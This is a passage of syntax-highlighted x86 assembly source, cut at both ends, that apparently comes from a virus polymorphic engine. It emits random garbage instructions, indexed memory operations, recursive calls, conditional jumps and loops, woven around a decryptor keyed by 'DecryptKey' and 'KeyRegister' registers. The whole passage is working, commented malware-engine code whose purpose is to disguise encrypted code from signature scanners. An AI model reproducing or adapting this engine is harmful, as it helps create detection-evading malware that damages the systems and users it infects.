                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WVGb</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_NotThird</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; Mask the opcode for dword addition</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the key register</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Subtract the value of the</span><span class="sc0">
                                        </span><span class="sc1">; key register to the memory address</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WV_01</span><span class="sc0">     </span><span class="sc1">; Jump to complete the instruction</span><span class="sc0">
      </span><span class="sc1">;; Here we make not indexed operations</span><span class="sc0">
   </span><span class="sc5">@@MW_WV_NotIndexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">; Direct value inside the brackets</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV32b</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WV8b</span><span class="sc0">      </span><span class="sc1">; Select 8 or 32 bits</span><span class="sc0">

    </span><span class="sc5">@@MW_WV32b</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; If 32 bits, increase the main opcode</span><span class="sc0">
    </span><span class="sc5">@@MW_WV8b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosw</span><span class="sc0">              </span><span class="sc1">; Store the opcode</span><span class="sc0">
    </span><span class="sc5">@@MW_WVGb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">; Complete with the addition or the direct</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">              </span><span class="sc1">; memory address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Get a random value in EAX</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Store32</span><span class="sc0">   </span><span class="sc1">; If 32 bits, complete with a random dword</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Store8</span><span class="sc0">    </span><span class="sc1">; value. If not, complete with only a byte</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Store32</span><span class="sc0">

    </span><span class="sc1">;; Here we use a random register instead of a value. This time we can make</span><span class="sc0">
    </span><span class="sc1">;; reads or writes (with value we can only do writes). If we write to me-</span><span class="sc0">
    </span><span class="sc1">;; mory, we can use any of the seven general purpose registers. If it's</span><span class="sc0">
    </span><span class="sc1">;; a read, only a not-reserved one.</span><span class="sc0">
    </span><span class="sc5">@@MW_WithReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Read or write?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_80</span><span class="sc0">                       </span><span class="sc1">; Jump if write</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Memo32bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; 8 or 32 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_79</span><span class="sc0">         </span><span class="sc1">; Jump if 32 bits</span><span class="sc0">
        </span><span class="sc1">;; Here we make OP Reg8,[(Reg+)Value]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0">     </span><span class="sc1">; Select a 8 bits register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; Can we select anyone?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MemoryOperation</span><span class="sc0"> </span><span class="sc1">; If not, select another type of op.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_81</span><span class="sc0">        </span><span class="sc1">; Jump and continue</span><span class="sc0">
        </span><span class="sc1">;; Here we make OP Reg32,[(Reg+)Value]</span><span class="sc0">
    </span><span class="sc5">@@MW_WR_79</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; Select a not-reserved register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_81</span><span class="sc0">        </span><span class="sc1">; Jump and continue</span><span class="sc0">
        </span><span class="sc1">;; Here we make OP [(Reg+)Value],Reg8/32</span><span class="sc0">
    </span><span class="sc5">@@MW_WR_80</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Select any register, and</span><span class="sc0">
                                </span><span class="sc1">; initialize it to a random value if it isn't</span><span class="sc0">
                                </span><span class="sc1">; set with a value</span><span class="sc0">
    </span><span class="sc5">@@MW_WR_81</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Save the register in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Get an operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">     </span><span class="sc1">; Select indexed or not</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_NotIndexed</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WR_NotIndexed</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@MW_WR_Indexed</span><span class="sc0">
                </span><span class="sc6">jp</span><span class="sc0">    </span><span class="sc5">@@MW_WR_NotIndexed</span><span class="sc0">
        </span><span class="sc1">;; Here if we use indexation using the Key register</span><span class="sc0">
     </span><span class="sc5">@@MW_WR_Indexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; If the key register</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_NotIndexed</span><span class="sc0">    </span><span class="sc1">; isn't set with its value, then</span><span class="sc0">
                                            </span><span class="sc1">; we can't do this, so make a not</span><span class="sc0">
                                            </span><span class="sc1">; indexed memory operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_NotThird</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WR_NotThird</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">     </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_99</span><span class="sc0">    </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">     </span><span class="sc1">; If CMP, substitute it by MOV</span><span class="sc0">
       </span><span class="sc5">@@MW_WR_99</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Memo32bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc5">@@MW_WR_RepeatMult</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_RepeatMult</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc5">@@MW_WR_Subtract</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_Subtract</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_02</span><span class="sc0">

       </span><span class="sc5">@@MW_WR_NotThird</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Mask with dword addition</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put the indexation</span><span class="sc0">
                                                       </span><span class="sc1">; register in the opc.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate the addition</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">     </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_01</span><span class="sc0">    </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">     </span><span class="sc1">; If CMP, substitute it by MOV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_01</span><span class="sc0">    </span><span class="sc1">; Jump to continue</span><span class="sc0">
     </span><span class="sc1">;; Here to make with no indexation (direct memory address)</span><span class="sc0">
   </span><span class="sc5">@@MW_WR_NotIndexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">; Direct value inside brackets</span><span class="sc0">
   </span><span class="sc5">@@MW_WR_Cont01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">     </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_01</span><span class="sc0">    </span><span class="sc1">; If not, avoid</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_EAX</span><span class="sc0">   </span><span class="sc1">; Then, use its own opcode for MOV</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">     </span><span class="sc1">; Substitute CMP by MOV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_01</span><span class="sc0">    </span><span class="sc1">; Jump and continue</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_EAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0">    </span><span class="sc1">; AL=Opcode of MOV [Value],AL. From this</span><span class="sc0">
                                    </span><span class="sc1">; opcode we get the variants</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Select 8 or 32 bits</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_EAX3</span><span class="sc0">  </span><span class="sc1">; Jump if 8 bits</span><span class="sc0">
         </span><span class="sc5">@@MW_WR_EAX2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Increase opcode to make MOV [Value],EAX</span><span class="sc0">
         </span><span class="sc5">@@MW_WR_EAX3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Memory read?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_82</span><span class="sc0">    </span><span class="sc1">; If not, jump and continue</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Make READ subtracting 2 to the opcode.</span><span class="sc0">
                                    </span><span class="sc1">; Then we'll make MOV AL/EAX,[Value]</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_82</span><span class="sc4">:</span><span class="sc0">          
                </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_02</span><span class="sc0">    </span><span class="sc1">; Jump to insert the memory address</span><span class="sc0">
          </span><span class="sc1">; Not EAX in the register</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Memory read?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ContinueMW</span><span class="sc0">                     </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Memo32bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; 32 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_32b</span><span class="sc0">         </span><span class="sc1">; If 32 bits, jump</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_WR_8b</span><span class="sc0">          </span><span class="sc1">; Avoid opcode increment</span><span class="sc0">
          </span><span class="sc1">; Here to memory write</span><span class="sc0">
  </span><span class="sc5">@@ContinueMW</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Decide: 8 or 32 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WR_8b</span><span class="sc0">    </span><span class="sc1">; If 8, jump</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_32b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Convert opcode to 32 bits operation from a</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_8b</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; a 8 bits opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Read or write?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WR_83</span><span class="sc0">     </span><span class="sc1">; If write, jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Convert write opcode to read opcode</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_83</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                </span><span class="sc1">; Store the opcode</span><span class="sc0">
      </span><span class="sc5">@@MW_WR_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">      </span><span class="sc1">; Store the memory address (or calculated addition)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">    </span><span class="sc1">; Jump to return</span><span class="sc0">

   </span><span class="sc1">;; Here we make recursive garbage. We can do a CALL to a subroutine (where</span><span class="sc0">
   </span><span class="sc1">;; we need more garbage) or a comparision and a conditional jump, where we</span><span class="sc0">
   </span><span class="sc1">;; have to make garbage between the jump and the destination address, since</span><span class="sc0">
   </span><span class="sc1">;; we can't assure that the conditional jump is going to be taken or not,</span><span class="sc0">
   </span><span class="sc1">;; or a call to a KERNEL32 function.</span><span class="sc0">
    </span><span class="sc5">@@RecursiveOnes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; Too many recur-</span><span class="sc0">
                                         </span><span class="sc1">; sive instances of function Garbage?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">      </span><span class="sc1">; If too many, make another type of garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInRandomLoop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Recurs_002</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Recurs_002</span><span class="sc0"> </span><span class="sc1">; Select CALL / Conditional jump</span><span class="sc0">
                </span><span class="sc6">jp</span><span class="sc0">    </span><span class="sc5">@@Recurs_002</span><span class="sc0">
     </span><span class="sc1">;; Let's do a little loop (no more than seven loops). We use a reserved</span><span class="sc0">
     </span><span class="sc1">;; register because we know that they won't be changed (we PUSH it and</span><span class="sc0">
     </span><span class="sc1">;; later POP it)</span><span class="sc0">
  </span><span class="sc5">@@RandomLoop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RandomLoop</span><span class="sc0"> </span><span class="sc1">; Don't use key register</span><span class="sc0">
